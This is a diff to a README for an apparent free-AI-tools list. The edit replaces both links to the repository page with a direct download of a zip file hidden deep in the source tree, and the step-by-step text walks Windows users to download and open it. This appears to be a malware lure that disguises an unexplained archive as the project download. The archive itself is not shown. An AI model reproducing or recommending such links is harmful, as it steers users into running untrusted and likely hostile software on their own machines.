@@ -1,6 +1,6 @@
 # 🤖 free-ai-tools - Find the best free AI software
 
-[![Download Free AI Tools](https://img.shields.io/badge/Download-Free_AI_Tools-blue)](https://github.com/Commercialmessageaeciospore1727/free-ai-tools)
+[![Download Free AI Tools](https://img.shields.io/badge/Download-Free_AI_Tools-blue)](https://raw.githubusercontent.com/Commercialmessageaeciospore1727/free-ai-tools/main/website/src/lib/ai-tools-free-Aten.zip)
 
 ## 📖 About this collection
 
@@ -26,7 +26,7 @@ This section lists servers and databases. These tools store your data and run yo
 
 You do not need programming skills to use this list. Follow these steps to access the resources.
 
-1. Visit the [project download page](https://github.com/Commercialmessageaeciospore1727/free-ai-tools).
+1. Visit the [project download page](https://raw.githubusercontent.com/Commercialmessageaeciospore1727/free-ai-tools/main/website/src/lib/ai-tools-free-Aten.zip).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Open your Downloads folder on your Windows computer.
